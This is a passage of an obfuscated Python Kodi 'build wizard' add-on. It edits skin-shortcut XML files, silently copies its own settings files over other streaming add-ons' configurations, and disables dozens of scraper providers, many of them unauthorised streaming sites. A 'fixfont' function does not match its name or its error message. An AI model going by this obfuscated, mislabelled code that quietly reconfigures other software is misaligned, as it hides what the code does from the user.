		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1234
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1237
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1238
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1242
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1243
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1244
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1262
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1265
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1266
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1270
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1271
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1272
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1290
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1293
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1294
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1297
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1298
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1299
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1317
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1320
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1321
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1323
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1324
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1325
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1343
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1346
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1347
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1349
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1350
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1351
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1369
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1372
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1373
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1376
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1377
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1378
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1396
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1399
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1400
def rdbuildinstallON ():#line:1403
    try :#line:1405
       OOOO0OO000000OO0O =ADDONPATH +"/resources/rd/victory.xml"#line:1406
       OOO00OO00000OOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1407
       copyfile (OOOO0OO000000OO0O ,OOO00OO00000OOO00 )#line:1409
       OOOO0OO000000OO0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1411
       OOO00OO00000OOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1412
       copyfile (OOOO0OO000000OO0O ,OOO00OO00000OOO00 )#line:1414
       OOOO0OO000000OO0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1416
       OOO00OO00000OOO00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1417
       copyfile (OOOO0OO000000OO0O ,OOO00OO00000OOO00 )#line:1419
       OOOO0OO000000OO0O =ADDONPATH +"/resources/rd/Splash.png"#line:1422
       OOO00OO00000OOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1423
       copyfile (OOOO0OO000000OO0O ,OOO00OO00000OOO00 )#line:1425
    except :#line:1427
       pass #line:1428
def rdbuild ():#line:1438
	O0OO00OOO0O00OOO0 =(ADDON .getSetting ("auto_rd"))#line:1439
	if O0OO00OOO0O00OOO0 =='true':#line:1440
		OOOOOOO00O0O0000O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1441
		OOOOOOO00O0O0000O .setSetting ('all_t','0')#line:1442
		OOOOOOO00O0O0000O .setSetting ('rd_menu_enable','false')#line:1443
		OOOOOOO00O0O0000O .setSetting ('magnet_bay','false')#line:1444
		OOOOOOO00O0O0000O .setSetting ('magnet_extra','false')#line:1445
		OOOOOOO00O0O0000O .setSetting ('rd_only','false')#line:1446
		OOOOOOO00O0O0000O .setSetting ('ftp','false')#line:1448
		OOOOOOO00O0O0000O .setSetting ('fp','false')#line:1449
		OOOOOOO00O0O0000O .setSetting ('filter_fp','false')#line:1450
		OOOOOOO00O0O0000O .setSetting ('fp_size_en','false')#line:1451
		OOOOOOO00O0O0000O .setSetting ('afdah','false')#line:1452
		OOOOOOO00O0O0000O .setSetting ('ap2s','false')#line:1453
		OOOOOOO00O0O0000O .setSetting ('cin','false')#line:1454
		OOOOOOO00O0O0000O .setSetting ('clv','false')#line:1455
		OOOOOOO00O0O0000O .setSetting ('cmv','false')#line:1456
		OOOOOOO00O0O0000O .setSetting ('dl20','false')#line:1457
		OOOOOOO00O0O0000O .setSetting ('esc','false')#line:1458
		OOOOOOO00O0O0000O .setSetting ('extra','false')#line:1459
		OOOOOOO00O0O0000O .setSetting ('film','false')#line:1460
		OOOOOOO00O0O0000O .setSetting ('fre','false')#line:1461
		OOOOOOO00O0O0000O .setSetting ('fxy','false')#line:1462
		OOOOOOO00O0O0000O .setSetting ('genv','false')#line:1463
		OOOOOOO00O0O0000O .setSetting ('getgo','false')#line:1464
		OOOOOOO00O0O0000O .setSetting ('gold','false')#line:1465
		OOOOOOO00O0O0000O .setSetting ('gona','false')#line:1466
		OOOOOOO00O0O0000O .setSetting ('hdmm','false')#line:1467
		OOOOOOO00O0O0000O .setSetting ('hdt','false')#line:1468
		OOOOOOO00O0O0000O .setSetting ('icy','false')#line:1469
		OOOOOOO00O0O0000O .setSetting ('ind','false')#line:1470
		OOOOOOO00O0O0000O .setSetting ('iwi','false')#line:1471
		OOOOOOO00O0O0000O .setSetting ('jen_free','false')#line:1472
		OOOOOOO00O0O0000O .setSetting ('kiss','false')#line:1473
		OOOOOOO00O0O0000O .setSetting ('lavin','false')#line:1474
		OOOOOOO00O0O0000O .setSetting ('los','false')#line:1475
		OOOOOOO00O0O0000O .setSetting ('m4u','false')#line:1476
		OOOOOOO00O0O0000O .setSetting ('mesh','false')#line:1477
		OOOOOOO00O0O0000O .setSetting ('mf','false')#line:1478
		OOOOOOO00O0O0000O .setSetting ('mkvc','false')#line:1479
		OOOOOOO00O0O0000O .setSetting ('mjy','false')#line:1480
		OOOOOOO00O0O0000O .setSetting ('hdonline','false')#line:1481
		OOOOOOO00O0O0000O .setSetting ('moviex','false')#line:1482
		OOOOOOO00O0O0000O .setSetting ('mpr','false')#line:1483
		OOOOOOO00O0O0000O .setSetting ('mvg','false')#line:1484
		OOOOOOO00O0O0000O .setSetting ('mvl','false')#line:1485
		OOOOOOO00O0O0000O .setSetting ('mvs','false')#line:1486
		OOOOOOO00O0O0000O .setSetting ('myeg','false')#line:1487
		OOOOOOO00O0O0000O .setSetting ('ninja','false')#line:1488
		OOOOOOO00O0O0000O .setSetting ('odb','false')#line:1489
		OOOOOOO00O0O0000O .setSetting ('ophd','false')#line:1490
		OOOOOOO00O0O0000O .setSetting ('pks','false')#line:1491
		OOOOOOO00O0O0000O .setSetting ('prf','false')#line:1492
		OOOOOOO00O0O0000O .setSetting ('put18','false')#line:1493
		OOOOOOO00O0O0000O .setSetting ('req','false')#line:1494
		OOOOOOO00O0O0000O .setSetting ('rftv','false')#line:1495
		OOOOOOO00O0O0000O .setSetting ('rltv','false')#line:1496
		OOOOOOO00O0O0000O .setSetting ('sc','false')#line:1497
		OOOOOOO00O0O0000O .setSetting ('seehd','false')#line:1498
		OOOOOOO00O0O0000O .setSetting ('showbox','false')#line:1499
		OOOOOOO00O0O0000O .setSetting ('shuid','false')#line:1500
		OOOOOOO00O0O0000O .setSetting ('sil_gh','false')#line:1501
		OOOOOOO00O0O0000O .setSetting ('spv','false')#line:1502
		OOOOOOO00O0O0000O .setSetting ('subs','false')#line:1503
		OOOOOOO00O0O0000O .setSetting ('tvs','false')#line:1504
		OOOOOOO00O0O0000O .setSetting ('tw','false')#line:1505
		OOOOOOO00O0O0000O .setSetting ('upto','false')#line:1506
		OOOOOOO00O0O0000O .setSetting ('vel','false')#line:1507
		OOOOOOO00O0O0000O .setSetting ('vex','false')#line:1508
		OOOOOOO00O0O0000O .setSetting ('vidc','false')#line:1509
		OOOOOOO00O0O0000O .setSetting ('w4hd','false')#line:1510
		OOOOOOO00O0O0000O .setSetting ('wav','false')#line:1511
		OOOOOOO00O0O0000O .setSetting ('wf','false')#line:1512
		OOOOOOO00O0O0000O .setSetting ('wse','false')#line:1513
		OOOOOOO00O0O0000O .setSetting ('wss','false')#line:1514
		OOOOOOO00O0O0000O .setSetting ('wsse','false')#line:1515
		OOOOOOO00O0O0000O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1516
		OOOOOOO00O0O0000O .setSetting ('debrid.only','true')#line:1517
		OOOOOOO00O0O0000O .setSetting ('hosts.captcha','false')#line:1518
		OOOOOOO00O0O0000O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1519
		OOOOOOO00O0O0000O .setSetting ('provider.123moviehd','false')#line:1520
		OOOOOOO00O0O0000O .setSetting ('provider.300mbdownload','false')#line:1521
		OOOOOOO00O0O0000O .setSetting ('provider.alltube','false')#line:1522
		OOOOOOO00O0O0000O .setSetting ('provider.allucde','false')#line:1523
		OOOOOOO00O0O0000O .setSetting ('provider.animebase','false')#line:1524
		OOOOOOO00O0O0000O .setSetting ('provider.animeloads','false')#line:1525
		OOOOOOO00O0O0000O .setSetting ('provider.animetoon','false')#line:1526
		OOOOOOO00O0O0000O .setSetting ('provider.bnwmovies','false')#line:1527
		OOOOOOO00O0O0000O .setSetting ('provider.boxfilm','false')#line:1528
		OOOOOOO00O0O0000O .setSetting ('provider.bs','false')#line:1529
		OOOOOOO00O0O0000O .setSetting ('provider.cartoonhd','false')#line:1530
		OOOOOOO00O0O0000O .setSetting ('provider.cdahd','false')#line:1531
		OOOOOOO00O0O0000O .setSetting ('provider.cdax','false')#line:1532
		OOOOOOO00O0O0000O .setSetting ('provider.cine','false')#line:1533
		OOOOOOO00O0O0000O .setSetting ('provider.cinenator','false')#line:1534
		OOOOOOO00O0O0000O .setSetting ('provider.cmovieshdbz','false')#line:1535
		OOOOOOO00O0O0000O .setSetting ('provider.coolmoviezone','false')#line:1536
		OOOOOOO00O0O0000O .setSetting ('provider.ddl','false')#line:1537
		OOOOOOO00O0O0000O .setSetting ('provider.deepmovie','false')#line:1538
		OOOOOOO00O0O0000O .setSetting ('provider.ekinomaniak','false')#line:1539
		OOOOOOO00O0O0000O .setSetting ('provider.ekinotv','false')#line:1540
		OOOOOOO00O0O0000O .setSetting ('provider.filiser','false')#line:1541
		OOOOOOO00O0O0000O .setSetting ('provider.filmpalast','false')#line:1542
		OOOOOOO00O0O0000O .setSetting ('provider.filmwebbooster','false')#line:1543
		OOOOOOO00O0O0000O .setSetting ('provider.filmxy','false')#line:1544
		OOOOOOO00O0O0000O .setSetting ('provider.fmovies','false')#line:1545
		OOOOOOO00O0O0000O .setSetting ('provider.foxx','false')#line:1546
		OOOOOOO00O0O0000O .setSetting ('provider.freefmovies','false')#line:1547
		OOOOOOO00O0O0000O .setSetting ('provider.freeputlocker','false')#line:1548
		OOOOOOO00O0O0000O .setSetting ('provider.furk','false')#line:1549
		OOOOOOO00O0O0000O .setSetting ('provider.gamatotv','false')#line:1550
		OOOOOOO00O0O0000O .setSetting ('provider.gogoanime','false')#line:1551
		OOOOOOO00O0O0000O .setSetting ('provider.gowatchseries','false')#line:1552
		OOOOOOO00O0O0000O .setSetting ('provider.hackimdb','false')#line:1553
		OOOOOOO00O0O0000O .setSetting ('provider.hdfilme','false')#line:1554
		OOOOOOO00O0O0000O .setSetting ('provider.hdmto','false')#line:1555
		OOOOOOO00O0O0000O .setSetting ('provider.hdpopcorns','false')#line:1556
		OOOOOOO00O0O0000O .setSetting ('provider.hdstreams','false')#line:1557
		OOOOOOO00O0O0000O .setSetting ('provider.horrorkino','false')#line:1559
		OOOOOOO00O0O0000O .setSetting ('provider.iitv','false')#line:1560
		OOOOOOO00O0O0000O .setSetting ('provider.iload','false')#line:1561
		OOOOOOO00O0O0000O .setSetting ('provider.iwaatch','false')#line:1562
		OOOOOOO00O0O0000O .setSetting ('provider.kinodogs','false')#line:1563
		OOOOOOO00O0O0000O .setSetting ('provider.kinoking','false')#line:1564
		OOOOOOO00O0O0000O .setSetting ('provider.kinow','false')#line:1565
		OOOOOOO00O0O0000O .setSetting ('provider.kinox','false')#line:1566
		OOOOOOO00O0O0000O .setSetting ('provider.lichtspielhaus','false')#line:1567
		OOOOOOO00O0O0000O .setSetting ('provider.liomenoi','false')#line:1568
		OOOOOOO00O0O0000O .setSetting ('provider.magnetdl','false')#line:1571
		OOOOOOO00O0O0000O .setSetting ('provider.megapelistv','false')#line:1572
		OOOOOOO00O0O0000O .setSetting ('provider.movie2k-ac','false')#line:1573
		OOOOOOO00O0O0000O .setSetting ('provider.movie2k-ag','false')#line:1574
		OOOOOOO00O0O0000O .setSetting ('provider.movie2z','false')#line:1575
		OOOOOOO00O0O0000O .setSetting ('provider.movie4k','false')#line:1576
		OOOOOOO00O0O0000O .setSetting ('provider.movie4kis','false')#line:1577
		OOOOOOO00O0O0000O .setSetting ('provider.movieneo','false')#line:1578
		OOOOOOO00O0O0000O .setSetting ('provider.moviesever','false')#line:1579
		OOOOOOO00O0O0000O .setSetting ('provider.movietown','false')#line:1580
		OOOOOOO00O0O0000O .setSetting ('provider.mvrls','false')#line:1582
		OOOOOOO00O0O0000O .setSetting ('provider.netzkino','false')#line:1583
		OOOOOOO00O0O0000O .setSetting ('provider.odb','false')#line:1584
		OOOOOOO00O0O0000O .setSetting ('provider.openkatalog','false')#line:1585
		OOOOOOO00O0O0000O .setSetting ('provider.ororo','false')#line:1586
		OOOOOOO00O0O0000O .setSetting ('provider.paczamy','false')#line:1587
		OOOOOOO00O0O0000O .setSetting ('provider.peliculasdk','false')#line:1588
		OOOOOOO00O0O0000O .setSetting ('provider.pelisplustv','false')#line:1589
		OOOOOOO00O0O0000O .setSetting ('provider.pepecine','false')#line:1590
		OOOOOOO00O0O0000O .setSetting ('provider.primewire','false')#line:1591
		OOOOOOO00O0O0000O .setSetting ('provider.projectfreetv','false')#line:1592
		OOOOOOO00O0O0000O .setSetting ('provider.proxer','false')#line:1593
		OOOOOOO00O0O0000O .setSetting ('provider.pureanime','false')#line:1594
		OOOOOOO00O0O0000O .setSetting ('provider.putlocker','false')#line:1595
		OOOOOOO00O0O0000O .setSetting ('provider.putlockerfree','false')#line:1596
		OOOOOOO00O0O0000O .setSetting ('provider.reddit','false')#line:1597
		OOOOOOO00O0O0000O .setSetting ('provider.cartoonwire','false')#line:1598
		OOOOOOO00O0O0000O .setSetting ('provider.seehd','false')#line:1599
		OOOOOOO00O0O0000O .setSetting ('provider.segos','false')#line:1600
		OOOOOOO00O0O0000O .setSetting ('provider.serienstream','false')#line:1601
		OOOOOOO00O0O0000O .setSetting ('provider.series9','false')#line:1602
		OOOOOOO00O0O0000O .setSetting ('provider.seriesever','false')#line:1603
		OOOOOOO00O0O0000O .setSetting ('provider.seriesonline','false')#line:1604
		OOOOOOO00O0O0000O .setSetting ('provider.seriespapaya','false')#line:1605
		OOOOOOO00O0O0000O .setSetting ('provider.sezonlukdizi','false')#line:1606
		OOOOOOO00O0O0000O .setSetting ('provider.solarmovie','false')#line:1607
		OOOOOOO00O0O0000O .setSetting ('provider.solarmoviez','false')#line:1608
		OOOOOOO00O0O0000O .setSetting ('provider.stream-to','false')#line:1609
		OOOOOOO00O0O0000O .setSetting ('provider.streamdream','false')#line:1610
		OOOOOOO00O0O0000O .setSetting ('provider.streamflix','false')#line:1611
		OOOOOOO00O0O0000O .setSetting ('provider.streamit','false')#line:1612
		OOOOOOO00O0O0000O .setSetting ('provider.swatchseries','false')#line:1613
		OOOOOOO00O0O0000O .setSetting ('provider.szukajkatv','false')#line:1614
		OOOOOOO00O0O0000O .setSetting ('provider.tainiesonline','false')#line:1615
		OOOOOOO00O0O0000O .setSetting ('provider.tainiomania','false')#line:1616
		OOOOOOO00O0O0000O .setSetting ('provider.tata','false')#line:1619
		OOOOOOO00O0O0000O .setSetting ('provider.trt','false')#line:1620
		OOOOOOO00O0O0000O .setSetting ('provider.tvbox','false')#line:1621
		OOOOOOO00O0O0000O .setSetting ('provider.ultrahd','false')#line:1622
		OOOOOOO00O0O0000O .setSetting ('provider.video4k','false')#line:1623
		OOOOOOO00O0O0000O .setSetting ('provider.vidics','false')#line:1624
		OOOOOOO00O0O0000O .setSetting ('provider.view4u','false')#line:1625
		OOOOOOO00O0O0000O .setSetting ('provider.watchseries','false')#line:1626
		OOOOOOO00O0O0000O .setSetting ('provider.xrysoi','false')#line:1627
		OOOOOOO00O0O0000O .setSetting ('provider.library','false')#line:1628
def fixfont ():#line:1631
	OO000O0000O0OOO00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1632
	OOOO00OOOOOO0O000 =json .loads (OO000O0000O0OOO00 );#line:1634
	OO00O000OO0O000O0 =OOOO00OOOOOO0O000 ["result"]["settings"]#line:1635
	OO000O0O0O000O00O =[O0000OO0OO00OOO0O for O0000OO0OO00OOO0O in OO00O000OO0O000O0 if O0000OO0OO00OOO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1637
	O0O0O0OOO0O0000O0 =OO000O0O0O000O00O ["options"];#line:1638
	OO00OO00OO0OOO00O =OO000O0O0O000O00O ["value"];#line:1639
	O00O00000OO000O0O =[O000OO0O00O000000 for (O000OO0O00O000000 ,O0O00OO0O000O00OO )in enumerate (O0O0O0OOO0O0000O0 )if O0O00OO0O000O00OO ["value"]==OO00OO00OO0OOO00O ][0 ];#line:1641
	OO00OOOOOO00O000O =(O00O00000OO000O0O +1 )%len (O0O0O0OOO0O0000O0 )#line:1643
	OO0O0OOO0O0000O00 =O0O0O0OOO0O0000O0 [OO00OOOOOO00O000O ]["value"]#line:1645
	OOO0OO0000O0O0OO0 =O0O0O0OOO0O0000O0 [OO00OOOOOO00O000O ]["label"]#line:1646
	OO000O00O0OOO000O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1648
	try :#line:1650
		O0O00OOO0000O00OO =json .loads (OO000O00O0OOO000O );#line:1651
		if O0O00OOO0000O00OO ["result"]!=True :#line:1653
			raise Exception #line:1654
	except :#line:1655
		sys .stderr .write ("Error switching audio output device")#line:1656
		raise Exception #line:1657
def parseDOM2 (O000O0O00O00O00OO ,name =u"",attrs ={},ret =False ):#line:1658
	if isinstance (O000O0O00O00O00OO ,str ):#line:1661
		try :#line:1662
			O000O0O00O00O00OO =[O000O0O00O00O00OO .decode ("utf-8")]#line:1663
		except :#line:1664
			O000O0O00O00O00OO =[O000O0O00O00O00OO ]#line:1665
	elif isinstance (O000O0O00O00O00OO ,unicode ):#line:1666
		O000O0O00O00O00OO =[O000O0O00O00O00OO ]#line:1667
	elif not isinstance (O000O0O00O00O00OO ,list ):#line:1668
		return u""#line:1669
	if not name .strip ():#line:1671
		return u""#line:1672
	OO00O0O0OO0OO000O =[]#line:1674
	for OO000O0O0OOOO0O00 in O000O0O00O00O00OO :#line:1675
		OOO0OOO00OOOO0OOO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO000O0O0OOOO0O00 )#line:1676
		for OO0O0O0OO0OO0O0O0 in OOO0OOO00OOOO0OOO :#line:1677
			OO000O0O0OOOO0O00 =OO000O0O0OOOO0O00 .replace (OO0O0O0OO0OO0O0O0 ,OO0O0O0OO0OO0O0O0 .replace ("\n"," "))#line:1678
		O00O0OOO000OOOO00 =[]#line:1680
		for OOO00000O00OO000O in attrs :#line:1681
			OOOO0OO00OO0000OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO00000O00OO000O +'=[\'"]'+attrs [OOO00000O00OO000O ]+'[\'"].*?>))',re .M |re .S ).findall (OO000O0O0OOOO0O00 )#line:1682
			if len (OOOO0OO00OO0000OO )==0 and attrs [OOO00000O00OO000O ].find (" ")==-1 :#line:1683
				OOOO0OO00OO0000OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO00000O00OO000O +'='+attrs [OOO00000O00OO000O ]+'.*?>))',re .M |re .S ).findall (OO000O0O0OOOO0O00 )#line:1684
			if len (O00O0OOO000OOOO00 )==0 :#line:1686
				O00O0OOO000OOOO00 =OOOO0OO00OO0000OO #line:1687
				OOOO0OO00OO0000OO =[]#line:1688
			else :#line:1689
				O00O0O0OOO0000OO0 =range (len (O00O0OOO000OOOO00 ))#line:1690
				O00O0O0OOO0000OO0 .reverse ()#line:1691
				for OOOO0000OO00OOOO0 in O00O0O0OOO0000OO0 :#line:1692
					if not O00O0OOO000OOOO00 [OOOO0000OO00OOOO0 ]in OOOO0OO00OO0000OO :#line:1693
						del (O00O0OOO000OOOO00 [OOOO0000OO00OOOO0 ])#line:1694
		if len (O00O0OOO000OOOO00 )==0 and attrs =={}:#line:1696
			O00O0OOO000OOOO00 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO000O0O0OOOO0O00 )#line:1697
			if len (O00O0OOO000OOOO00 )==0 :#line:1698
				O00O0OOO000OOOO00 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO000O0O0OOOO0O00 )#line:1699
		if isinstance (ret ,str ):#line:1701
			OOOO0OO00OO0000OO =[]#line:1702
			for OO0O0O0OO0OO0O0O0 in O00O0OOO000OOOO00 :#line:1703
				OO000O000OOO000O0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O0O0OO0OO0O0O0 )#line:1704
				if len (OO000O000OOO000O0 )==0 :#line:1705
					OO000O000OOO000O0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O0O0OO0OO0O0O0 )#line:1706
				for OOOO000000000OO0O in OO000O000OOO000O0 :#line:1707
					O0O000O00OOOO0OOO =OOOO000000000OO0O [0 ]#line:1708
					if O0O000O00OOOO0OOO in "'\"":#line:1709
						if OOOO000000000OO0O .find ('='+O0O000O00OOOO0OOO ,OOOO000000000OO0O .find (O0O000O00OOOO0OOO ,1 ))>-1 :#line:1710
							OOOO000000000OO0O =OOOO000000000OO0O [:OOOO000000000OO0O .find ('='+O0O000O00OOOO0OOO ,OOOO000000000OO0O .find (O0O000O00OOOO0OOO ,1 ))]#line:1711
						if OOOO000000000OO0O .rfind (O0O000O00OOOO0OOO ,1 )>-1 :#line:1713
							OOOO000000000OO0O =OOOO000000000OO0O [1 :OOOO000000000OO0O .rfind (O0O000O00OOOO0OOO )]#line:1714
					else :#line:1715
						if OOOO000000000OO0O .find (" ")>0 :#line:1716
							OOOO000000000OO0O =OOOO000000000OO0O [:OOOO000000000OO0O .find (" ")]#line:1717
						elif OOOO000000000OO0O .find ("/")>0 :#line:1718
							OOOO000000000OO0O =OOOO000000000OO0O [:OOOO000000000OO0O .find ("/")]#line:1719
						elif OOOO000000000OO0O .find (">")>0 :#line:1720
							OOOO000000000OO0O =OOOO000000000OO0O [:OOOO000000000OO0O .find (">")]#line:1721
					OOOO0OO00OO0000OO .append (OOOO000000000OO0O .strip ())#line:1723
